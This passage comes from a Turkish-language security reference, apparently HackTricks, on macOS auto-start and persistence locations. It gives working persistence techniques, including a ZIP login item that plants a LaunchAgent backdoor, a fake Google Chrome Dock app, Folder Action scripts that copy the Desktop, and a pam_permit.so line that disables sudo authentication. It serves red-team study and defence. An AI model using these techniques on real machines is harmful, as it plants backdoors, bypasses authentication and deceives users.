osascript -e 'tell application "System Events" to delete login item "itemname"'
```
Bu öğeler **`~/Library/Application Support/com.apple.backgroundtaskmanagementagent`** dosyasında saklanır.

**Login items**, [SMLoginItemSetEnabled](https://developer.apple.com/documentation/servicemanagement/1501557-smloginitemsetenabled?language=objc) API'si kullanılarak da belirtilebilir; bu API yapılandırmayı **`/var/db/com.apple.xpc.launchd/loginitems.501.plist`** içinde saklar.

### ZIP as Login Item

(Login Items hakkındaki önceki bölüme bakın; bu onun bir uzantısıdır)

Bir **ZIP** dosyasını **Login Item** olarak saklarsanız, **`Archive Utility`** bu dosyayı açar. Örneğin zip dosyası **`~/Library`** içinde saklanıyorsa ve bir backdoor içeren **`LaunchAgents/file.plist`** klasörünü barındırıyorsa, bu klasör oluşturulur (varsayılan olarak mevcut değildir) ve plist eklenir. Böylece kullanıcı bir sonraki oturum açışında, plist içinde belirtilen **backdoor çalıştırılır**.

Başka bir seçenek de kullanıcı HOME dizini içinde **`.bash_profile`** ve **`.zshenv`** dosyalarını oluşturmaktır. Böylece LaunchAgents klasörü zaten mevcutsa bu teknik yine çalışır.

### At

Writeup: [https://theevilbit.github.io/beyond/beyond_0014/](https://theevilbit.github.io/beyond/beyond_0014/)<sup>[[16]](#references)</sup>

- sandbox bypass için kullanışlıdır: [✅](https://emojipedia.org/check-mark-button)
- Ancak **`at`** komutunu **çalıştırmanız** gerekir ve komut **etkinleştirilmiş** olmalıdır
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Location

- **`at`** komutunu **çalıştırmanız** gerekir ve komut **etkinleştirilmiş** olmalıdır

#### **Description**

`at` görevleri, belirli zamanlarda çalıştırılacak **tek seferlik görevleri zamanlamak** için tasarlanmıştır. cron job'larının aksine, `at` görevleri çalıştırıldıktan sonra otomatik olarak kaldırılır. Bu görevlerin sistem yeniden başlatmaları arasında kalıcı olduğunu ve belirli koşullar altında potansiyel güvenlik sorunları oluşturabileceğini belirtmek önemlidir.<sup>[[16]](#references)</sup>

**Varsayılan olarak** devre dışıdırlar, ancak **root** kullanıcısı bunları şu komutla **etkinleştirebilir**:
```bash
sudo launchctl load -F /System/Library/LaunchDaemons/com.apple.atrun.plist
```
Bu, 1 saat içinde bir dosya oluşturacaktır:
```bash
echo "echo 11 > /tmp/at.txt" | at now+1
```
İş kuyruğunu `atq` kullanarak kontrol edin:
```shell-session
sh-3.2# atq
26	Tue Apr 27 00:46:00 2021
22	Wed Apr 28 00:29:00 2021
```
Yukarıda zamanlanmış iki iş görebiliriz. İşin ayrıntılarını `at -c JOBNUMBER` kullanarak yazdırabiliriz.
```shell-session
sh-3.2# at -c 26
#!/bin/sh
# atrun uid=0 gid=0
# mail csaby 0
umask 22
SHELL=/bin/sh; export SHELL
TERM=xterm-256color; export TERM
USER=root; export USER
SUDO_USER=csaby; export SUDO_USER
SUDO_UID=501; export SUDO_UID
SSH_AUTH_SOCK=/private/tmp/com.apple.launchd.co51iLHIjf/Listeners; export SSH_AUTH_SOCK
__CF_USER_TEXT_ENCODING=0x0:0:0; export __CF_USER_TEXT_ENCODING
MAIL=/var/mail/root; export MAIL
PATH=/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin; export PATH
PWD=/Users/csaby; export PWD
SHLVL=1; export SHLVL
SUDO_COMMAND=/usr/bin/su; export SUDO_COMMAND
HOME=/var/root; export HOME
LOGNAME=root; export LOGNAME
LC_CTYPE=UTF-8; export LC_CTYPE
SUDO_GID=20; export SUDO_GID
_=/usr/bin/at; export _
cd /Users/csaby || {
echo 'Execution directory inaccessible' >&2
exit 1
}
unset OLDPWD
echo 11 > /tmp/at.txt
```
> [!WARNING]
> AT tasks etkin değilse oluşturulan task'ler çalıştırılmaz.

**job dosyaları** `/private/var/at/jobs/` konumunda bulunabilir.
```
sh-3.2# ls -l /private/var/at/jobs/
total 32
-rw-r--r--  1 root  wheel    6 Apr 27 00:46 .SEQ
-rw-------  1 root  wheel    0 Apr 26 23:17 .lockfile
-r--------  1 root  wheel  803 Apr 27 00:46 a00019019bdcd2
-rwx------  1 root  wheel  803 Apr 27 00:46 a0001a019bdcd2
```
Dosya adı queue’yu, job numarasını ve çalışmasının planlandığı zamanı içerir. Örneğin `a0001a019bdcd2` dosyasına göz atalım.

- `a` - queue
- `0001a` - hex cinsinden job numarası, `0x1a = 26`
- `019bdcd2` - hex cinsinden zaman. Epoch’tan bu yana geçen dakikaları temsil eder. `0x019bdcd2`, decimal olarak `26991826` değerine eşittir. Bunu 60 ile çarparsak `1619509560` elde ederiz; bu da `GMT: 2021. 27 Nisan, Salı 7:46:00` zamanına karşılık gelir.

Job dosyasını yazdırırsak `at -c` kullanarak elde ettiğimiz bilgilerin aynısını içerdiğini görürüz.

### Folder Actions

Writeup: [https://theevilbit.github.io/beyond/beyond_0024/](https://theevilbit.github.io/beyond/beyond_0024/)<sup>[[17]](#references)</sup>\
Writeup: [https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d](https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d)<sup>[[18]](#references)</sup>

- Sandbox bypass için kullanışlı: [✅](https://emojipedia.org/check-mark-button)
- Ancak Folder Actions’ı configure edebilmek için `System Events` ile iletişim kuracak şekilde `osascript`’i argümanlarla çağırabilmeniz gerekir
- TCC bypass: [🟠](https://emojipedia.org/large-orange-circle)
- Desktop, Documents ve Downloads gibi bazı temel TCC izinlerine sahiptir

#### Location

- **`/Library/Scripts/Folder Action Scripts`**
- Root gerekli
- **Trigger**: Belirtilen folder’a erişim
- **`~/Library/Scripts/Folder Action Scripts`**
- **Trigger**: Belirtilen folder’a erişim

#### Description & Exploitation

Folder Actions; öğe ekleme, kaldırma veya folder window’unu açma ya da yeniden boyutlandırma gibi diğer işlemler de dahil olmak üzere, bir folder’daki değişikliklerle otomatik olarak tetiklenen script’lerdir. Bu actions çeşitli görevler için kullanılabilir ve Finder UI veya terminal komutları gibi farklı yöntemlerle tetiklenebilir.<sup>[[17]](#references)[[18]](#references)</sup>

Folder Actions’ı ayarlamak için şu seçeneklere sahipsiniz:

1. [Automator](https://support.apple.com/guide/automator/welcome/mac) ile bir Folder Action workflow’u oluşturup bunu service olarak yüklemek.
2. Bir folder’ın context menu’sündeki Folder Actions Setup üzerinden manuel olarak bir script bağlamak.
3. Programatik olarak bir Folder Action ayarlamak için OSAScript kullanarak `System Events.app`’e Apple Event mesajları göndermek.
- Bu method, action’ı system’e yerleştirmek ve bir persistence düzeyi sağlamak için özellikle kullanışlıdır.

Aşağıdaki script, bir Folder Action tarafından execute edilebilecek bir örnektir:
```applescript
// source.js
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("touch /tmp/folderaction.txt");
app.doShellScript("touch ~/Desktop/folderaction.txt");
app.doShellScript("mkdir /tmp/asd123");
app.doShellScript("cp -R ~/Desktop /tmp/asd123");
```
Yukarıdaki scripti Folder Actions tarafından kullanılabilir hale getirmek için şu komutla derleyin:
```bash
osacompile -l JavaScript -o folder.scpt source.js
```
Script derlendikten sonra, aşağıdaki scripti çalıştırarak Folder Actions'ı ayarlayın. Bu script, Folder Actions'ı global olarak etkinleştirir ve önceden derlenmiş scripti özellikle Desktop klasörüne bağlar.
```javascript
// Enabling and attaching Folder Action
var se = Application("System Events")
se.folderActionsEnabled = true
var myScript = se.Script({ name: "source.js", posixPath: "/tmp/source.js" })
var fa = se.FolderAction({ name: "Desktop", path: "/Users/username/Desktop" })
se.folderActions.push(fa)
fa.scripts.push(myScript)
```
Kurulum script'ini şu şekilde çalıştırın:
```bash
osascript -l JavaScript /Users/username/attach.scpt
```
- Bu, bu persistence'ı GUI üzerinden uygulamanın yoludur:

Bu çalıştırılacak script'tir:
```applescript:source.js
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("touch /tmp/folderaction.txt");
app.doShellScript("touch ~/Desktop/folderaction.txt");
app.doShellScript("mkdir /tmp/asd123");
app.doShellScript("cp -R ~/Desktop /tmp/asd123");
```
Şununla derleyin: `osacompile -l JavaScript -o folder.scpt source.js`

Şuraya taşıyın:
```bash
mkdir -p "$HOME/Library/Scripts/Folder Action Scripts"
mv /tmp/folder.scpt "$HOME/Library/Scripts/Folder Action Scripts"
```
Ardından `Folder Actions Setup` uygulamasını açın, **izlemek istediğiniz klasörü** seçin ve kendi durumunuzda **`folder.scpt`** dosyasını seçin (benim durumumda dosyaya output2.scp adını verdim):

<figure><img src="../images/image (39).png" alt="" width="297"><figcaption></figcaption></figure>

Şimdi bu klasörü **Finder** ile açarsanız script'iniz çalıştırılır.

Bu yapılandırma, base64 formatında **`~/Library/Preferences/com.apple.FolderActionsDispatcher.plist`** konumundaki **plist** dosyasında saklandı.

Şimdi bu persistence yöntemini GUI erişimi olmadan hazırlamayı deneyelim:

1. Yedeklemek için **`~/Library/Preferences/com.apple.FolderActionsDispatcher.plist`** dosyasını `/tmp` konumuna **kopyalayın**:
- `cp ~/Library/Preferences/com.apple.FolderActionsDispatcher.plist /tmp`
2. Az önce ayarladığınız Folder Actions'ı **kaldırın**:

<figure><img src="../images/image (40).png" alt=""><figcaption></figcaption></figure>

Artık boş bir ortamımız olduğuna göre:

3. Yedek dosyayı kopyalayın: `cp /tmp/com.apple.FolderActionsDispatcher.plist ~/Library/Preferences/`
4. Bu config'i yüklemek için Folder Actions Setup.app'i açın: `open "/System/Library/CoreServices/Applications/Folder Actions Setup.app/"`

> [!CAUTION]
> Bu benim için çalışmadı, ancak writeup'taki talimatlar şunlar:(

### Dock kısayolları

Writeup: [https://theevilbit.github.io/beyond/beyond_0027/](https://theevilbit.github.io/beyond/beyond_0027/)<sup>[[19]](#references)</sup>

- sandbox'ı bypass etmek için kullanışlı: [✅](https://emojipedia.org/check-mark-button)
- Ancak system içine malicious bir application yüklemiş olmanız gerekir
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Konum

- `~/Library/Preferences/com.apple.dock.plist`
- **Trigger**: Kullanıcı Dock içindeki uygulamaya tıkladığında

#### Açıklama ve Exploitation

Dock'ta görünen tüm applications, **`~/Library/Preferences/com.apple.dock.plist`**<sup>[[19]](#references)</sup> içinde belirtilir.

Sadece şu komutla **bir application eklemek** mümkündür:
```bash
# Add /System/Applications/Books.app
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/System/Applications/Books.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'

# Restart Dock
killall Dock
```
Bir miktar **social engineering** kullanarak dock içinde örneğin **Google Chrome**'u taklit edebilir ve aslında kendi **script**'inizi çalıştırabilirsiniz:
```bash
#!/bin/sh

# THIS REQUIRES GOOGLE CHROME TO BE INSTALLED (TO COPY THE ICON)

rm -rf /tmp/Google\ Chrome.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Google\ Chrome.app/Contents/MacOS
mkdir -p /tmp/Google\ Chrome.app/Contents/Resources

# Payload to execute
echo '#!/bin/sh
open /Applications/Google\ Chrome.app/ &
touch /tmp/ImGoogleChrome' > /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

chmod +x /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

# Info.plist
cat << EOF > /tmp/Google\ Chrome.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CFBundleExecutable</key>
<string>Google Chrome</string>
<key>CFBundleIdentifier</key>
<string>com.google.Chrome</string>
<key>CFBundleName</key>
<string>Google Chrome</string>
<key>CFBundleVersion</key>
<string>1.0</string>
<key>CFBundleShortVersionString</key>
<string>1.0</string>
<key>CFBundleInfoDictionaryVersion</key>
<string>6.0</string>
<key>CFBundlePackageType</key>
<string>APPL</string>
<key>CFBundleIconFile</key>
<string>app</string>
</dict>
</plist>
EOF

# Copy icon from Google Chrome
cp /Applications/Google\ Chrome.app/Contents/Resources/app.icns /tmp/Google\ Chrome.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Google Chrome.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
killall Dock
```
### Color Pickers

Writeup: [https://theevilbit.github.io/beyond/beyond_0017](https://theevilbit.github.io/beyond/beyond_0017/)<sup>[[20]](#references)</sup>

- Sandbox'u bypass etmek için kullanışlı: [🟠](https://emojipedia.org/large-orange-circle)
- Çok spesifik bir action gerçekleşmesi gerekir
- Başka bir sandbox içinde olacaksınız
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Konum

- `/Library/ColorPickers`
- Root gerekir
- Trigger: Color picker'ı kullanın
- `~/Library/ColorPickers`
- Trigger: Color picker'ı kullanın

#### Açıklama & Exploit

Kodunuzla bir color picker bundle'ı **compile** edin ([örnek olarak bunu](https://github.com/viktorstrate/color-picker-plus) kullanabilirsiniz), bir constructor ekleyin ([Screen Saver bölümündeki](macos-auto-start-locations.md#screen-saver) gibi) ve bundle'ı `~/Library/ColorPickers` konumuna kopyalayın.<sup>[[20]](#references)</sup>

Ardından color picker tetiklendiğinde kodunuz da çalışmalıdır.

Library'nizi yükleyen binary'nin **çok kısıtlayıcı bir sandbox'ı** olduğunu unutmayın: `/System/Library/Frameworks/AppKit.framework/Versions/C/XPCServices/LegacyExternalColorPickerService-x86_64.xpc/Contents/MacOS/LegacyExternalColorPickerService-x86_64`
```bash
[Key] com.apple.security.temporary-exception.sbpl
[Value]
[Array]
[String] (deny file-write* (home-subpath "/Library/Colors"))
[String] (allow file-read* process-exec file-map-executable (home-subpath "/Library/ColorPickers"))
[String] (allow file-read* (extension "com.apple.app-sandbox.read"))
```
### Finder Sync Plugins

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0026/](https://theevilbit.github.io/beyond/beyond_0026/)<sup>[[21]](#references)</sup>\
**Writeup**: [https://objective-see.org/blog/blog_0x11.html](https://objective-see.org/blog/blog_0x11.html)<sup>[[22]](#references)</sup>

- sandbox bypass için kullanışlı: **Hayır, çünkü kendi uygulamanızı çalıştırmanız gerekir**
- TCC bypass: ???

#### Konum

- Belirli bir uygulama

#### Açıklama ve Exploit

Finder Sync Extension içeren bir uygulama örneği [burada bulunabilir](https://github.com/D00MFist/InSync).

Uygulamalar `Finder Sync Extensions` içerebilir. Bu extension, çalıştırılacak bir uygulamanın içine yerleştirilir. Ayrıca extension'ın kodunu çalıştırabilmesi için **geçerli bir Apple developer certificate ile imzalanmış** olması, **sandboxed** olması (ancak daha esnek istisnalar eklenebilir) ve şu tür bir şeyle register edilmesi gerekir:<sup>[[21]](#references)[[22]](#references)</sup>
```bash
pluginkit -a /Applications/FindIt.app/Contents/PlugIns/FindItSync.appex
pluginkit -e use -i com.example.InSync.InSync
```
### Ekran Koruyucu

Writeup: [https://theevilbit.github.io/beyond/beyond_0016/](https://theevilbit.github.io/beyond/beyond_0016/)<sup>[[23]](#references)</sup>\
Writeup: [https://posts.specterops.io/saving-your-access-d562bf5bf90b](https://posts.specterops.io/saving-your-access-d562bf5bf90b)<sup>[[24]](#references)</sup>

- Sandbox'u bypass etmek için kullanışlıdır: [🟠](https://emojipedia.org/large-orange-circle)
- Ancak sonunda common application sandbox içinde olursunuz
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Konum

- `/System/Library/Screen Savers`
- Root gereklidir
- **Tetikleyici**: Ekran koruyucuyu seçin
- `/Library/Screen Savers`
- Root gereklidir
- **Tetikleyici**: Ekran koruyucuyu seçin
- `~/Library/Screen Savers`
- **Tetikleyici**: Ekran koruyucuyu seçin

<figure><img src="../images/image (38).png" alt="" width="375"><figcaption></figcaption></figure>

#### Açıklama ve Exploit

Xcode'da yeni bir proje oluşturun ve yeni bir **Screen Saver** oluşturmak için şablonu seçin. Ardından kodunuzu ekleyin; örneğin aşağıdaki kod loglar oluşturur.<sup>[[23]](#references)[[24]](#references)</sup>

**Derleyin** ve `.saver` bundle'ını **`~/Library/Screen Savers`** konumuna kopyalayın. Ardından Screen Saver GUI'sini açın ve üzerine tıklamanız yeterlidir; çok sayıda log oluşturulmalıdır:
```bash
sudo log stream --style syslog --predicate 'eventMessage CONTAINS[c] "hello_screensaver"'

Timestamp                       (process)[PID]
2023-09-27 22:55:39.622369+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver void custom(int, const char **)
2023-09-27 22:55:39.622623+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver -[ScreenSaverExampleView initWithFrame:isPreview:]
2023-09-27 22:55:39.622704+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver -[ScreenSaverExampleView hasConfigureSheet]
```
> [!CAUTION]
> Bu kodu yükleyen binary'nin (`/System/Library/Frameworks/ScreenSaver.framework/PlugIns/legacyScreenSaver.appex/Contents/MacOS/legacyScreenSaver`) entitlements'ları içinde **`com.apple.security.app-sandbox`** bulunması nedeniyle **common application sandbox** içinde olacağınızı unutmayın.

Saver kodu:
```objectivec
//
//  ScreenSaverExampleView.m
//  ScreenSaverExample
//
//  Created by Carlos Polop on 27/9/23.
//

#import "ScreenSaverExampleView.h"

@implementation ScreenSaverExampleView

- (instancetype)initWithFrame:(NSRect)frame isPreview:(BOOL)isPreview
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
self = [super initWithFrame:frame isPreview:isPreview];
if (self) {
[self setAnimationTimeInterval:1/30.0];
}
return self;
}

- (void)startAnimation
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
[super startAnimation];
}

- (void)stopAnimation
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
[super stopAnimation];
}

- (void)drawRect:(NSRect)rect
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
[super drawRect:rect];
}

- (void)animateOneFrame
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
return;
}

- (BOOL)hasConfigureSheet
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
return NO;
}

- (NSWindow*)configureSheet
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
return nil;
}

__attribute__((constructor))
void custom(int argc, const char **argv) {
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
}

@end
```
### Spotlight Eklentileri

writeup: [https://theevilbit.github.io/beyond/beyond_0011/](https://theevilbit.github.io/beyond/beyond_0011/)<sup>[[25]](#references)</sup>

- sandbox bypass için kullanışlı: [🟠](https://emojipedia.org/large-orange-circle)
- Ancak bir application sandbox içinde sonlanırsınız
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)
- sandbox oldukça kısıtlı görünüyor

#### Konum

- `~/Library/Spotlight/`
- **Tetikleyici**: Spotlight plugin tarafından yönetilen bir uzantıya sahip yeni bir dosya oluşturulur.
- `/Library/Spotlight/`
- **Tetikleyici**: Spotlight plugin tarafından yönetilen bir uzantıya sahip yeni bir dosya oluşturulur.
- Root gerekli
- `/System/Library/Spotlight/`
- **Tetikleyici**: Spotlight plugin tarafından yönetilen bir uzantıya sahip yeni bir dosya oluşturulur.
- Root gerekli
- `Some.app/Contents/Library/Spotlight/`
- **Tetikleyici**: Spotlight plugin tarafından yönetilen bir uzantıya sahip yeni bir dosya oluşturulur.
- Yeni bir app gerekli

#### Açıklama ve Exploitation

Spotlight, kullanıcılara **bilgisayarlarındaki verilere hızlı ve kapsamlı erişim** sağlamak üzere tasarlanmış, macOS'in yerleşik arama özelliğidir.\
Bu hızlı arama özelliğini desteklemek için Spotlight, **özel bir veritabanı** tutar ve **çoğu dosyayı ayrıştırarak** bir index oluşturur; böylece hem dosya adları hem de içerikleri üzerinden hızlı aramalar yapılabilir.<sup>[[25]](#references)</sup>

Spotlight'ın temel mekanizması, 'metadata server' anlamına gelen 'mds' adlı merkezi bir process içerir. Bu process, Spotlight servisinin tamamını yönetir. Buna ek olarak, farklı dosya türlerini indexleme gibi çeşitli bakım görevlerini gerçekleştiren birden fazla 'mdworker' daemon'ı bulunur (`ps -ef | grep mdworker`). Bu görevler, Spotlight'ın çok çeşitli dosya formatlarındaki içerikleri anlamasını ve indexlemesini sağlayan Spotlight importer plugin'leri veya **".mdimporter bundle'ları** aracılığıyla gerçekleştirilir.

Plugin'ler veya **`.mdimporter`** bundle'ları daha önce belirtilen konumlarda bulunur ve yeni bir bundle ortaya çıktığında bir dakika içinde yüklenir (herhangi bir servisi yeniden başlatmaya gerek yoktur). Bu bundle'ların **hangi dosya türlerini ve uzantıları yönetebileceklerini** belirtmeleri gerekir; bu sayede Spotlight, belirtilen uzantıya sahip yeni bir dosya oluşturulduğunda bunları kullanır.

Yüklü tüm `mdimporter`'ları şu komutla bulmak mümkündür:
```bash
mdimport -L
Paths: id(501) (
"/System/Library/Spotlight/iWork.mdimporter",
"/System/Library/Spotlight/iPhoto.mdimporter",
"/System/Library/Spotlight/PDF.mdimporter",
[...]
```
Ve örneğin **/Library/Spotlight/iBooksAuthor.mdimporter**, bu tür dosyaları (diğerlerinin yanı sıra `.iba` ve `.book` uzantılı dosyaları) ayrıştırmak için kullanılır:
```json
plutil -p /Library/Spotlight/iBooksAuthor.mdimporter/Contents/Info.plist

[...]
"CFBundleDocumentTypes" => [
0 => {
"CFBundleTypeName" => "iBooks Author Book"
"CFBundleTypeRole" => "MDImporter"
"LSItemContentTypes" => [
0 => "com.apple.ibooksauthor.book"
1 => "com.apple.ibooksauthor.pkgbook"
2 => "com.apple.ibooksauthor.template"
3 => "com.apple.ibooksauthor.pkgtemplate"
]
"LSTypeIsPackage" => 0
}
]
[...]
=> {
"UTTypeConformsTo" => [
0 => "public.data"
1 => "public.composite-content"
]
"UTTypeDescription" => "iBooks Author Book"
"UTTypeIdentifier" => "com.apple.ibooksauthor.book"
"UTTypeReferenceURL" => "http://www.apple.com/ibooksauthor"
"UTTypeTagSpecification" => {
"public.filename-extension" => [
0 => "iba"
1 => "book"
]
}
}
[...]
```
> [!CAUTION]
> Diğer `mdimporter`'ların Plist'ini kontrol ederseniz **`UTTypeConformsTo`** girdisini bulamayabilirsiniz. Bunun nedeni, bunun yerleşik bir _Uniform Type Identifiers_ ([UTI](https://en.wikipedia.org/wiki/Uniform_Type_Identifier)) olması ve uzantıları belirtmesinin gerekmemesidir.
>
> Ayrıca, System varsayılan plugin'leri her zaman önceliklidir; bu nedenle bir attacker yalnızca Apple'ın kendi `mdimporter`'ları tarafından başka şekilde index'lenmeyen dosyalara erişebilir.

Kendi importer'ınızı oluşturmak için şu project ile başlayabilirsiniz: [https://github.com/megrimm/pd-spotlight-importer](https://github.com/megrimm/pd-spotlight-importer). Ardından adı, **`CFBundleDocumentTypes`** değerini değiştirin ve desteklemek istediğiniz extension'ı desteklemesi için **`UTImportedTypeDeclarations`** ekleyin; bunları **`schema.xml`** içinde de belirtin.\
Daha sonra **`GetMetadataForFile`** function'ının code'unu, işlenen extension'a sahip bir file oluşturulduğunda payload'unuzu execute edecek şekilde **change** edin.

Son olarak yeni **`.mdimporter`**'ınızı build edip önceki üç location'dan birine copy'layın; yüklendiğini **log'ları monitoring ederek** veya **`mdimport -L.`** kontrol ederek görebilirsiniz.

### ~~Preference Pane~~

> [!CAUTION]
> Bunun artık çalışıyor gibi görünmediğini unutmayın.

Writeup: [https://theevilbit.github.io/beyond/beyond_0009/](https://theevilbit.github.io/beyond/beyond_0009/)<sup>[[26]](#references)</sup>

- sandbox bypass için kullanışlı: [🟠](https://emojipedia.org/large-orange-circle)
- Belirli bir user action gerekir
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Location

- **`/System/Library/PreferencePanes`**
- **`/Library/PreferencePanes`**
- **`~/Library/PreferencePanes`**

#### Description

Bunun artık çalışıyor gibi görünmediğini unutmayın.<sup>[[26]](#references)</sup>

## Root Sandbox Bypass

> [!TIP]
> Burada, **root** olarak bir şeyleri **bir file'a yazarak** ve/veya başka **garip koşullar** gerektirerek basitçe execute etmenizi sağlayan **sandbox bypass** için kullanışlı start location'ları bulabilirsiniz.

### Periodic

Writeup: [https://theevilbit.github.io/beyond/beyond_0019/](https://theevilbit.github.io/beyond/beyond_0019/)<sup>[[27]](#references)</sup>

- sandbox bypass için kullanışlı: [🟠](https://emojipedia.org/large-orange-circle)
- Ancak root olmanız gerekir
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Location

- `/etc/periodic/daily`, `/etc/periodic/weekly`, `/etc/periodic/monthly`, `/usr/local/etc/periodic`
- Root gerekir
- **Trigger**: Zamanı geldiğinde
- `/etc/daily.local`, `/etc/weekly.local` veya `/etc/monthly.local`
- Root gerekir
- **Trigger**: Zamanı geldiğinde

#### Description & Exploitation

Periodic script'leri (**`/etc/periodic`**), `/System/Library/LaunchDaemons/com.apple.periodic*` içinde yapılandırılmış **launch daemon**'ları nedeniyle execute edilir. `/etc/periodic/` içinde saklanan script'lerin **file'ın owner'ı olarak execute edildiğini** unutmayın; bu nedenle bu yöntem potansiyel bir privilege escalation için çalışmaz.<sup>[[27]](#references)</sup>
```bash
# Launch daemons that will execute the periodic scripts
ls -l /System/Library/LaunchDaemons/com.apple.periodic*
-rw-r--r--  1 root  wheel  887 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-daily.plist
-rw-r--r--  1 root  wheel  895 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-monthly.plist
-rw-r--r--  1 root  wheel  891 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-weekly.plist

# The scripts located in their locations
ls -lR /etc/periodic
total 0
drwxr-xr-x  11 root  wheel  352 May 13 00:29 daily
drwxr-xr-x   5 root  wheel  160 May 13 00:29 monthly
drwxr-xr-x   3 root  wheel   96 May 13 00:29 weekly

/etc/periodic/daily:
total 72
-rwxr-xr-x  1 root  wheel  1642 May 13 00:29 110.clean-tmps
-rwxr-xr-x  1 root  wheel   695 May 13 00:29 130.clean-msgs
[...]

/etc/periodic/monthly:
total 24
-rwxr-xr-x  1 root  wheel   888 May 13 00:29 199.rotate-fax
-rwxr-xr-x  1 root  wheel  1010 May 13 00:29 200.accounting
-rwxr-xr-x  1 root  wheel   606 May 13 00:29 999.local

/etc/periodic/weekly:
total 8
-rwxr-xr-x  1 root  wheel  620 May 13 00:29 999.local
```
**`/etc/defaults/periodic.conf`** içinde belirtilen, çalıştırılacak başka periyodik scriptler de vardır:
```bash
grep "Local scripts" /etc/defaults/periodic.conf
daily_local="/etc/daily.local"				# Local scripts
weekly_local="/etc/weekly.local"			# Local scripts
monthly_local="/etc/monthly.local"			# Local scripts
```
Herhangi bir şekilde `/etc/daily.local`, `/etc/weekly.local` veya `/etc/monthly.local` dosyalarından herhangi birini yazabilirseniz, bu dosya **er ya da geç çalıştırılır**.

> [!WARNING]
> Periodic script'in **script'in sahibi olarak çalıştırılacağını** unutmayın. Bu nedenle script'in sahibi normal bir kullanıcıysa, script o kullanıcı olarak çalıştırılır (bu, privilege escalation saldırılarını engelleyebilir).

### PAM

Writeup: [Linux Hacktricks PAM](../linux-hardening/software-information/pam-pluggable-authentication-modules.md)\
Writeup: [https://theevilbit.github.io/beyond/beyond_0005/](https://theevilbit.github.io/beyond/beyond_0005/)<sup>[[28]](#references)</sup>

- Sandbox'u bypass etmek için kullanışlıdır: [🟠](https://emojipedia.org/large-orange-circle)
- Ancak root olmanız gerekir
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Konum

- Her zaman root gereklidir

#### Açıklama ve Exploitation

PAM, macOS içinde kolay execution'dan ziyade **persistence** ve malware üzerine odaklandığından, bu blog ayrıntılı bir açıklama sunmayacaktır; **bu tekniği daha iyi anlamak için writeup'ları okuyun**.<sup>[[28]](#references)</sup>

PAM modüllerini şu komutla kontrol edin:
```bash
ls -l /etc/pam.d
```
PAM'i abuse eden bir persistence/privilege escalation tekniği, /etc/pam.d/sudo modülünü değiştirip başına şu satırı eklemek kadar kolaydır:
```bash
auth       sufficient     pam_permit.so
```
Yani **şuna benzer** bir şey olacak:
```bash
# sudo: auth account password session
auth       sufficient     pam_permit.so
auth       include        sudo_local
auth       sufficient     pam_smartcard.so
auth       required       pam_opendirectory.so
account    required       pam_permit.so
password   required       pam_deny.so
session    required       pam_permit.so
```
Bu nedenle **`sudo` kullanma girişimleri çalışacaktır**.

> [!CAUTION]
> Bu dizinin TCC tarafından korunduğunu ve bu nedenle kullanıcının erişim isteyen bir istem almasının oldukça muhtemel olduğunu unutmayın.

Bir diğer güzel örnek, PAM modüllerine parametre vermenin de mümkün olduğunu görebileceğiniz su'dur (ayrıca bu dosyaya backdoor da yerleştirebilirsiniz):
```bash
cat /etc/pam.d/su
# su: auth account session
auth       sufficient     pam_rootok.so
auth       required       pam_opendirectory.so
account    required       pam_group.so no_warn group=admin,wheel ruser root_only fail_safe
account    required       pam_opendirectory.so no_check_shell
password   required       pam_opendirectory.so
session    required       pam_launchd.so
```
### Authorization Plugin'leri

Writeup: [https://theevilbit.github.io/beyond/beyond_0028/](https://theevilbit.github.io/beyond/beyond_0028/)<sup>[[29]](#references)</sup>\
Writeup: [https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65](https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65)<sup>[[30]](#references)</sup>

- Sandbox bypass için kullanışlı: [🟠](https://emojipedia.org/large-orange-circle)
- Ancak root olmanız ve ek configs yapmanız gerekir
- TCC bypass: ???

#### Konum

- `/Library/Security/SecurityAgentPlugins/`
- Root gereklidir
- Plugin'i kullanacak şekilde authorization database'i yapılandırmak da gerekir

